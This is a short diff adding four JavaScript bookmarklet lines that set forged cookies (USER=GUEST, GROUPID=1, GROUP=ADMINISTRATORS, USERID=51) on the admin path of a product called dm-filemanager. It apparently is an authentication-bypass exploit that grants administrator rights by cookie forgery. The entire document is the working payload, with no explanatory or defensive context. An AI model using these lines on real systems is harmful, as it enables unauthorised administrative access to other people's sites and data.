@@ -1,0 +1,4 @@
+javascript:document.cookie=&quot;USER=GUEST;path=/products/dm-filemanager/demo/admin/&quot;;
+javascript:document.cookie=&quot;GROUPID=1;path=/products/dm-filemanager/demo/admin/&quot;;
+javascript:document.cookie=&quot;GROUP=ADMINISTRATORS;path=/products/dm-filemanager/demo/admin/&quot;;
+javascript:document.cookie=&quot;USERID=51;path=/products/dm-filemanager/demo/admin/&quot;;
